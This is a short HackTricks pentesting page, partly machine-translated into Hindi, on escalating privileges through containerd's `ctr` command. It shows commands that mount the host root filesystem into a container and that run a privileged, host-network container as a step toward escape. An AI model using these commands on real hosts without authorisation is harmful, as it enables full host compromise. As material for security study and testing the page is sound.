# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basic information

Go to the following link to learn **क्या है containerd** और `ctr`:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE 1

अगर आप पाते हैं कि एक होस्ट में `ctr` कमांड है:
```bash
which ctr
/usr/bin/ctr
```
आप चित्रों की सूची बना सकते हैं:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
और फिर **उनमें से एक इमेज को चलाएं जिसमें होस्ट रूट फ़ोल्डर को माउंट किया गया हो**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

एक कंटेनर को विशेषाधिकार प्राप्त करके चलाएँ और इससे बाहर निकलें।\
आप एक विशेषाधिकार प्राप्त कंटेनर को इस प्रकार चला सकते हैं:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
फिर आप **विशिष्ट क्षमताओं का दुरुपयोग करके इससे बचने** के लिए निम्नलिखित पृष्ठ में उल्लिखित कुछ तकनीकों का उपयोग कर सकते हैं:

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
